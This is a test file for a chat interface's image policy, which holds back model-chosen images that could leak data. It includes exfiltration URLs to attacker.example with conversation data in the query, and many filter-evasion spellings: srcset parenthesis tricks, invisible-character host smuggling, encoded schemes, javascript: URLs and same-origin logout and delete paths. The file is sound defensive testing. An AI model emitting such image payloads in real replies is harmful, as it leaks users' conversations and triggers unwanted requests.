import { describe, it, expect, vi, afterEach } from 'vitest';
import { AparteConfig } from '../aparte-config';
import { defaultSanitizer } from '../sanitize';
import {
    applyImagePolicy, applyImagePolicyWithoutDom, compileImagePolicy, decideImageAddress, srcsetUrls,
    type AparteImageDecision, type HeldImageWords,
} from '../image-policy';

/*
 * The image policy (`image-policy.ts`): a picture a model or a tool chose loads only when the
 * app said it may. The attack it answers is one line of Markdown —
 * `![](https://attacker.example/c.png?d=<the conversation>)` — fetched with no click.
 */

const ATTACKER = 'https://attacker.example/c.png?d=SECRET_FROM_CONVERSATION';

afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals(); });

/** What a browser builds from an answer: two spellings of one tree read the same. */
const built = (html: string): string => {
    const t = document.createElement('template');
    t.innerHTML = html;
    return t.innerHTML;
};

describe('what a picture does under the default policy', () => {
    const decide = (address: string): AparteImageDecision => new AparteConfig().decideImage(address);

    it('holds a picture from another site, with the conversation in its address', () => {
        expect(decide(ATTACKER)).toBe('hold');
    });

    it('holds one from the page’s own site too: it would carry the reader’s cookies', () => {
        expect(decide('/api/logout?all=1')).toBe('hold');
        expect(decide(`${location.origin}/account/delete?confirm=1`)).toBe('hold');
        expect(decide('//attacker.example/c.png')).toBe('hold');
    });

    it('loads what makes no request: data: and blob:, and an empty address', () => {
        expect(decide('data:image/png;base64,iVBORw0KGgo=')).toBe('load');
        expect(decide('blob:https://site.example/1b2c')).toBe('load');
        expect(decide('')).toBe('load');
        expect(decide(' \t')).toBe('load');
    });

    it('drops an address that is no web address', () => {
        for (const address of ['ftp://attacker.example/x.png', 'mailto:a@b.c', 'javascript:alert(1)', 'tel:123']) {
            expect(decide(address), address).toBe('drop');
        }
    });
});

describe('a list of what loads', () => {
    it("loads the page's own origin for 'self', and accepts CSP's quoted spelling", () => {
        for (const self of ['self', "'self'"]) {
            const cfg = new AparteConfig();
            cfg.setImagePolicy([self]);
            expect(cfg.decideImage('/img/chart.png'), self).toBe('load');
            expect(cfg.decideImage(`${location.origin}/img/chart.png`), self).toBe('load');
            expect(cfg.decideImage(ATTACKER), self).toBe('hold');
        }
    });

    it('loads an origin it names, and only that origin', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['https://cdn.example.com']);
        expect(cfg.decideImage('https://cdn.example.com/a/b.png')).toBe('load');
        expect(cfg.decideImage('https://cdn.example.com.attacker.example/b.png')).toBe('hold');
        expect(cfg.decideImage('http://cdn.example.com/b.png')).toBe('hold');
        expect(cfg.decideImage('https://cdn.example.com:8443/b.png')).toBe('hold');
    });

    it("loads every picture for '*'", () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['*']);
        expect(cfg.decideImage(ATTACKER)).toBe('load');
        expect(cfg.decideImage('javascript:alert(1)')).toBe('drop');
    });

    it('says so, once, for an entry that names nothing, and lets it allow nothing', () => {
        const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['cdn.example.com', 'https://cdn.example.com']);
        expect(warn).toHaveBeenCalledTimes(1);
        expect(String(warn.mock.calls[0]?.[0])).toContain('cdn.example.com');
        expect(cfg.decideImage('https://cdn.example.com/x.png')).toBe('load');
    });
});

describe('a function policy', () => {
    it('gets the address resolved against the page, and only http(s) ones', () => {
        const seen: string[] = [];
        const cfg = new AparteConfig();
        cfg.setImagePolicy((url) => { seen.push(url); return 'load'; });
        cfg.decideImage('/img/a.png');
        cfg.decideImage('data:image/png;base64,AAAA');
        cfg.decideImage('javascript:alert(1)');
        expect(seen).toEqual([`${location.origin}/img/a.png`]);
    });

    it('holds a picture for any answer but load or drop: a typo must not load it', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(() => 'Load' as AparteImageDecision);
        expect(cfg.decideImage(ATTACKER)).toBe('hold');
        cfg.setImagePolicy(() => 'drop');
        expect(cfg.decideImage(ATTACKER)).toBe('drop');
    });

    it('holds what it was asked about when it throws, and says so once', () => {
        const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
        const cfg = new AparteConfig();
        cfg.setImagePolicy(() => { throw new Error('no'); });
        expect(cfg.decideImage(ATTACKER)).toBe('hold');
        expect(cfg.decideImage('https://other.example/x.png')).toBe('hold');
        expect(warn).toHaveBeenCalledTimes(1);
    });
});

describe('a picture the reader chose to see', () => {
    it('loads from then on where the policy would only have held it', () => {
        const cfg = new AparteConfig();
        cfg.showImage(ATTACKER);
        expect(cfg.decideImage(ATTACKER)).toBe('load');
        expect(cfg.decideImage('https://attacker.example/other.png')).toBe('hold');
    });

    it('stays dropped when the policy drops it', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(() => 'drop');
        cfg.showImage(ATTACKER);
        expect(cfg.decideImage(ATTACKER)).toBe('drop');
    });

    it('is forgotten by a reset, and belongs to its config alone', () => {
        const a = new AparteConfig();
        const b = new AparteConfig();
        a.showImage(ATTACKER);
        expect(b.decideImage(ATTACKER)).toBe('hold');
        a.reset();
        expect(a.decideImage(ATTACKER)).toBe('hold');
    });
});

describe('sanitizeHtml applies the policy after the sanitizer', () => {
    it('turns a remote picture into a link that names its host, and fetches nothing', () => {
        const cfg = new AparteConfig();
        const out = cfg.sanitizeHtml(`<p>Here: <img src="${ATTACKER}" alt="sales chart"></p>`);
        expect(out).not.toContain('<img');
        const link = new DOMParser().parseFromString(out, 'text/html').querySelector('a')!;
        expect(link.className).toBe('aparte-tag aparte-image-held');
        expect(link.getAttribute('href')).toBe(ATTACKER);
        expect(link.getAttribute('data-aparte-image')).toBe(ATTACKER);
        expect(link.getAttribute('data-aparte-image-alt')).toBe('sales chart');
        expect(link.getAttribute('target')).toBe('_blank');
        expect(link.getAttribute('rel')).toBe('noopener noreferrer');
        expect(link.getAttribute('aria-label')).toBe('Load the image “sales chart” from attacker.example');
        expect(link.getAttribute('title')).toBe('Load the image from attacker.example');
        expect(link.querySelector('.aparte-image-held__host')!.textContent).toBe('attacker.example');
        expect(link.querySelector('.aparte-image-held__alt')!.textContent).toBe('sales chart');
        expect(link.querySelector('svg')).not.toBeNull();
    });

    it('lets an allowed picture keep its place and sends it without a referrer', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['https://cdn.example.com']);
        const out = cfg.sanitizeHtml('<img src="https://cdn.example.com/a.png" alt="a" referrerpolicy="unsafe-url">');
        expect(built(out)).toBe('<img src="https://cdn.example.com/a.png" alt="a" referrerpolicy="no-referrer">');
    });

    it('lets a picture its own address decides keep only the srcset candidates that load', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['https://cdn.example.com']);
        const out = cfg.sanitizeHtml(`<img src="https://cdn.example.com/a.png" srcset="https://cdn.example.com/a2.png 2x, ${ATTACKER} 3x">`);
        expect(built(out)).toBe('<img src="https://cdn.example.com/a.png" srcset="https://cdn.example.com/a2.png 2x" referrerpolicy="no-referrer">');
    });

    it('holds a picture that has only a srcset, under its first address', () => {
        const out = new AparteConfig().sanitizeHtml(`<img srcset="${ATTACKER} 1x, https://b.example/2.png 2x">`);
        expect(out).toContain(`data-aparte-image="${ATTACKER.replace(/&/g, '&amp;')}"`);
    });

    it('drops a <source> with nothing that loads, and lets its <img> decide alone', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['https://cdn.example.com']);
        const out = cfg.sanitizeHtml(`<picture><source srcset="${ATTACKER} 1x"><source srcset="https://cdn.example.com/b.webp" type="image/webp"><img src="https://cdn.example.com/b.png"></picture>`);
        expect(out).not.toContain('attacker.example');
        expect(out).toContain('<source srcset="https://cdn.example.com/b.webp" type="image/webp">');
        expect(out).toContain('referrerpolicy="no-referrer"');
    });

    it('sends a <source> its <img> picks without a referrer, even when the <img> has no address of its own', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['https://cdn.example.com']);
        const out = cfg.sanitizeHtml('<picture><source srcset="https://cdn.example.com/a.png"><img alt="x"></picture>');
        expect(new DOMParser().parseFromString(out, 'text/html').querySelector('img')!.getAttribute('referrerpolicy')).toBe('no-referrer');
    });

    it('writes back a srcset it read, never the model’s: a browser picks only what was judged', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['*']);
        const out = cfg.sanitizeHtml('<img src="https://a.example/1.png" srcset="  https://a.example/1.png   1x ,https://a.example/2.png 2x,, ">');
        expect(new DOMParser().parseFromString(out, 'text/html').querySelector('img')!.getAttribute('srcset')).toBe('https://a.example/1.png 1x, https://a.example/2.png 2x');
    });

    it('holds a relative picture: `![](/api/logout)` is no request the model may make', () => {
        const out = new AparteConfig().sanitizeHtml('<img src="/api/logout?all=1">');
        expect(out).not.toContain('<img');
        expect(out).toContain('data-aparte-image="/api/logout?all=1"');
    });

    it('drops a picture the policy drops', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(() => 'drop');
        expect(cfg.sanitizeHtml(`<p>a<img src="${ATTACKER}">b</p>`)).toBe('<p>ab</p>');
    });

    it('keeps the rule when the app replaces the sanitizer', () => {
        const cfg = new AparteConfig();
        cfg.setHtmlSanitizer((html) => html);
        expect(cfg.sanitizeHtml(`<img src="${ATTACKER}">`)).not.toContain('<img');
    });

    it('leaves HTML with no picture as it came', () => {
        const cfg = new AparteConfig();
        cfg.setHtmlSanitizer(null);
        vi.spyOn(console, 'warn').mockImplementation(() => {});
        expect(cfg.sanitizeHtml('<p><a href=x>link</a></p>')).toBe('<p><a href=x>link</a></p>');
        expect(cfg.sanitizeHtml('<img onerror=x>')).toBe('<img onerror=x>');
    });
});

describe('a held picture drawn again', () => {
    it('comes out the same from a second pass: the settle re-sanitises what the stream wrote', () => {
        const cfg = new AparteConfig();
        const once = cfg.sanitizeHtml(`<p><img src="${ATTACKER}" alt="x"></p>`);
        const twice = cfg.sanitizeHtml(once);
        expect(built(twice)).toBe(built(once));
    });

    it('loads once the policy allows it, or once the reader chose to see it', () => {
        const cfg = new AparteConfig();
        const held = cfg.sanitizeHtml(`<img src="${ATTACKER}" alt="x">`);
        cfg.showImage(ATTACKER);
        expect(built(cfg.sanitizeHtml(held))).toBe(built(`<img src="${ATTACKER}" alt="x" referrerpolicy="no-referrer">`));
    });

    it('is redrawn from what it holds, so a forged one says what the policy says', () => {
        const cfg = new AparteConfig();
        const forged = `<a href="https://elsewhere.example/" data-aparte-image="${ATTACKER}" title="Your photo" aria-label="Your photo">Your photo from your own site</a>`;
        const link = new DOMParser().parseFromString(cfg.sanitizeHtml(forged), 'text/html').querySelector('a')!;
        expect(link.getAttribute('href')).toBe(ATTACKER);
        expect(link.getAttribute('title')).toBe('Load the image from attacker.example');
        expect(link.textContent).not.toContain('Your photo');
    });

    it('goes when what it holds is no web address', () => {
        const cfg = new AparteConfig();
        cfg.setHtmlSanitizer(null);
        vi.spyOn(console, 'warn').mockImplementation(() => {});
        expect(cfg.sanitizeHtml('<p><a data-aparte-image="javascript:alert(1)" href="javascript:alert(1)">x</a></p>')).toBe('<p></p>');
    });

    it('leaves a picture with no address alone, whatever else it carries: it fetches nothing', () => {
        const cfg = new AparteConfig();
        const html = `<p><img data-aparte-image="${ATTACKER}" alt="x"></p>`;
        expect(cfg.sanitizeHtml(html)).toBe(html);
    });

    it('stays shown after a redraw when the reader showed it, whatever its srcset held', () => {
        const cfg = new AparteConfig();
        const html = '<p><img src="https://photos.example/a.png" srcset="https://photos.example/a@2x.png 2x" alt="cat"></p>';
        const chip = new DOMParser().parseFromString(cfg.sanitizeHtml(html), 'text/html').querySelector('[data-aparte-image]')!;
        cfg.showImage(chip.getAttribute('data-aparte-image')!);
        // The reply drawn again from its source: the picture the reader chose, without the
        // candidate nobody chose.
        expect(built(cfg.sanitizeHtml(html))).toBe(built('<p><img src="https://photos.example/a.png" alt="cat" referrerpolicy="no-referrer"></p>'));
    });
});

describe('a held picture inside a link of the reply', () => {
    const BADGE = '<p><a href="https://ci.example/build"><img src="https://img.shields.io/badge.svg" alt="build"></a></p>';

    it('stays inside the link, as a button: a link inside a link would be taken apart', () => {
        const live = document.createElement('div');
        live.innerHTML = new AparteConfig().sanitizeHtml(BADGE);
        const link = live.querySelector('a[href="https://ci.example/build"]')!;
        const held = link.querySelector('.aparte-image-held')!;
        expect(held.localName).toBe('span');
        expect(held.getAttribute('role')).toBe('button');
        expect(held.getAttribute('tabindex')).toBe('0');
        expect(held.getAttribute('data-aparte-image')).toBe('https://img.shields.io/badge.svg');
        expect(held.hasAttribute('href')).toBe(false);
    });

    it('comes out the same from a second pass, and from the pass with no DOM', () => {
        const cfg = new AparteConfig();
        const once = cfg.sanitizeHtml(BADGE);
        expect(built(cfg.sanitizeHtml(once))).toBe(built(once));
        vi.stubGlobal('document', undefined);
        let withoutDom: string;
        try { withoutDom = cfg.sanitizeHtml(BADGE); } finally { vi.unstubAllGlobals(); }
        expect(built(withoutDom)).toBe(built(once));
    });
});

describe('what a held picture says', () => {
    it('speaks the config’s language', () => {
        const cfg = new AparteConfig();
        cfg.extendLocale({ imageLoad: 'Charger l’image depuis {host}', imageLoadNamed: 'Charger l’image « {alt} » depuis {host}' });
        const link = new DOMParser().parseFromString(cfg.sanitizeHtml(`<img src="${ATTACKER}" alt="graphique">`), 'text/html').querySelector('a')!;
        expect(link.getAttribute('aria-label')).toBe('Charger l’image « graphique » depuis attacker.example');
        expect(link.getAttribute('title')).toBe('Charger l’image depuis attacker.example');
    });

    it('writes a description as text, whatever it spells', () => {
        const cfg = new AparteConfig();
        const alt = '"><script>x</script> $& {host} $1';
        const out = cfg.sanitizeHtml(`<img src="${ATTACKER}" alt="${alt.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;')}">`);
        const link = new DOMParser().parseFromString(out, 'text/html').querySelector('a')!;
        expect(link.querySelector('script')).toBeNull();
        expect(link.getAttribute('data-aparte-image-alt')).toBe(alt);
        expect(link.getAttribute('aria-label')).toBe(`Load the image “${alt}” from attacker.example`);
    });

    it('names the host exactly, a look-alike in its ASCII form', () => {
        const out = new AparteConfig().sanitizeHtml('<img src="https://www.exаmple.com/x.png">');
        expect(out).toContain('xn--');
    });
});

describe('setImagePolicy', () => {
    it('redraws what is on screen, and not when it is told the same rule again', () => {
        const cfg = new AparteConfig();
        const listener = vi.fn();
        cfg.subscribe(listener);
        cfg.setImagePolicy(['self']);
        cfg.setImagePolicy(['self']);
        expect(listener).toHaveBeenCalledTimes(1);
        cfg.setImagePolicy(['self', 'https://cdn.example.com']);
        expect(listener).toHaveBeenCalledTimes(2);
    });
});

describe('srcset addresses', () => {
    it('reads a data: address with its comma, and descriptors with theirs', () => {
        expect(srcsetUrls('data:image/png;base64,AAA 2x, small.png 1x')).toEqual(['data:image/png;base64,AAA', 'small.png']);
        expect(srcsetUrls('a.png 100w,b.png 200w')).toEqual(['a.png', 'b.png']);
        // No space after the comma: a browser reads ONE address, and so must the policy, since
        // that one address is the request it would make.
        expect(srcsetUrls('a.png,b.png')).toEqual(['a.png,b.png']);
        expect(srcsetUrls('a.png, b.png')).toEqual(['a.png', 'b.png']);
        // Two descriptors, a density and a word: a browser drops that candidate, and so does this.
        expect(srcsetUrls(' a.png 1x (x, y), b.png 2x')).toEqual(['b.png']);
        expect(srcsetUrls('')).toEqual([]);
    });

    it('reads parentheses the way a browser does: the first `)` closes them', () => {
        // To a parser that nests them, `((),` hides the comma and the second address with it.
        expect(srcsetUrls('data:image/png;base64,AAAA 1x ((), https://attacker.example/c.png 1x')).toEqual(['https://attacker.example/c.png']);
    });

    it('splits on HTML’s whitespace only: U+00A0 and U+FEFF stay inside an address', () => {
        expect(srcsetUrls(' data:image/png;base64,AA/../../../api/logout 1x')).toEqual([' data:image/png;base64,AA/../../../api/logout']);
        expect(srcsetUrls('https://cdn.example.com﻿.attacker.example/c.png 1x')).toEqual(['https://cdn.example.com﻿.attacker.example/c.png']);
    });
});

describe('a srcset spelled to be read two ways', () => {
    /** Every address an element of the output would fetch, read as a browser reads it. */
    const fetched = (html: string): string[] => {
        const doc = new DOMParser().parseFromString(html, 'text/html');
        return [...doc.querySelectorAll('img, source')].flatMap((el) => [
            ...(el.getAttribute('src') ? [el.getAttribute('src')!] : []),
            ...srcsetUrls(el.getAttribute('srcset') ?? ''),
        ]).map((address) => new URL(address, document.baseURI).href);
    };

    it('holds what a browser would fetch behind parentheses, on an <img> and on a <source>', () => {
        const cfg = new AparteConfig();
        for (const html of [
            `<img alt="" srcset="data:image/png;base64,AAAA 1x ((), ${ATTACKER} 1x">`,
            '<picture><source srcset=",data:image/png;base64,AAAA 1x ((), https://attacker.example/s.png 1x"><img src="data:image/png;base64,AAAA" alt=""></picture>',
        ]) {
            expect(fetched(cfg.sanitizeHtml(html)).filter((url) => url.includes('attacker.example')), html).toEqual([]);
        }
    });

    it('holds a path on the page’s own site written behind a no-break space', () => {
        const out = new AparteConfig().sanitizeHtml('<img alt="" srcset="&nbsp;data:image/png;base64,AA/../../../api/logout 1x">');
        expect(fetched(out)).toEqual([]);
        expect(out).toContain('aparte-image-held');
    });

    it('holds a host spelled with a U+FEFF inside an allowed one', () => {
        const cfg = new AparteConfig();
        cfg.setImagePolicy(['https://cdn.example.com']);
        const out = cfg.sanitizeHtml('<img alt="" srcset="https://cdn.example.com&#xFEFF;.attacker.example/c.png 1x">');
        expect(fetched(out)).toEqual([]);
        expect(new DOMParser().parseFromString(out, 'text/html').querySelector('.aparte-image-held__host')!.textContent).toBe('cdn.example.com.attacker.example');
    });
});

describe('with no DOM, the pass gives what a browser pass gives', () => {
    const words: HeldImageWords = { load: (h) => `Load from ${h}`, named: (h, a) => `Load ${a} from ${h}`, icon: '<svg class="aparte-icon"></svg>' };
    const decider = compileImagePolicy(['https://cdn.example.com']);
    const decide = (address: string) => decideImageAddress(decider, address);
    const withoutDom = (html: string): string => {
        vi.stubGlobal('document', undefined);
        try { return applyImagePolicyWithoutDom(html, decide, () => words); } finally { vi.unstubAllGlobals(); }
    };

    const corpus = [
        `<p>a <img src="${ATTACKER}" alt="chart"> b</p>`,
        '<img src="https://cdn.example.com/a.png" alt="ok" referrerpolicy="unsafe-url">',
        `<picture><source srcset="${ATTACKER} 1x"><source srcset="https://cdn.example.com/b.webp"><img src="https://cdn.example.com/b.png"></picture>`,
        `<img src="https://cdn.example.com/a.png" srcset="${ATTACKER} 2x">`,
        `<a class="aparte-tag aparte-image-held" href="${ATTACKER}" data-aparte-image="${ATTACKER}" data-aparte-image-alt="x"><span>x</span></a> after`,
        '<a data-aparte-image="https://cdn.example.com/c.png" data-aparte-image-alt="c">c</a>',
        `<img data-aparte-image="${ATTACKER}">`,
        '<p>no picture <b>at all</b></p>',
        `<!-- <img src="${ATTACKER}"> --><p>text</p>`,
        '<p><a href="https://ci.example/build"><img src="https://img.shields.io/badge.svg" alt="build"></a> passing</p>',
        '<picture><source srcset="https://cdn.example.com/a.png"><img alt="x"></picture>',
        '<img src="https://cdn.example.com/a.png" srcset="  https://cdn.example.com/a.png   1x ,https://cdn.example.com/b.png 2x,, ">',
        `<img alt="" srcset="data:image/png;base64,AAAA 1x ((), ${ATTACKER} 1x">`,
        `<span data-aparte-image="${ATTACKER}">x</span> and <a href="https://cdn.example.com/">in <span data-aparte-image="${ATTACKER}">y</span> a link</a>`,
    ];

    it.each(corpus)('%s', (html) => {
        const inBrowser = applyImagePolicy(html, decide, () => words);
        expect(built(withoutDom(html))).toBe(built(inBrowser));
    });

    it('leaves a raw-text element alone', () => {
        const html = `<textarea><img src="${ATTACKER}"></textarea>`;
        expect(withoutDom(html)).toBe(html);
    });

    it('reads the corpus (a corpus that silently shrinks is the failure worth catching)', () => {
        expect(corpus.length).toBeGreaterThan(8);
    });

    it('holds a relative address, which has no page to resolve against', () => {
        const self = compileImagePolicy(['self']);
        vi.stubGlobal('document', undefined);
        vi.stubGlobal('location', undefined);
        try {
            const out = applyImagePolicyWithoutDom('<img src="/img/a.png">', (a) => decideImageAddress(self, a), () => words);
            expect(out).toContain('data-aparte-image="/img/a.png"');
        } finally { vi.unstubAllGlobals(); }
    });
});

describe('the default sanitizer and the policy together', () => {
    it('never lets a remote picture through, however the model spells it', () => {
        const cfg = new AparteConfig();
        const spellings = [
            `<img src="${ATTACKER}">`,
            `<IMG SRC="${ATTACKER}">`,
            `<img src=${ATTACKER.replace(/&/g, '&amp;')}>`,
            `<img src="  ${ATTACKER}">`,
            '<img src="//attacker.example/c.png">',
            '<img src="/\\attacker.example/c.png">',
            '<img src="https:attacker.example/c.png">',
            `<img srcset="${ATTACKER} 1x">`,
            `<picture><source srcset="${ATTACKER}"><img alt="x"></picture>`,
            `<img src="&#104;ttps://attacker.example/c.png">`,
        ];
        for (const html of spellings) {
            const out = cfg.sanitizeHtml(html);
            const doc = new DOMParser().parseFromString(out, 'text/html');
            const fetching = [...doc.querySelectorAll('img[src], img[srcset], source[src], source[srcset]')]
                .filter((el) => /attacker\.example/.test(`${el.getAttribute('src') ?? ''} ${el.getAttribute('srcset') ?? ''}`));
            expect(fetching, html).toEqual([]);
        }
    });

    it('is not part of defaultSanitizer itself: chained in front, it stays a sanitizer', () => {
        expect(defaultSanitizer(`<img src="${ATTACKER}">`)).toContain('<img');
    });
});
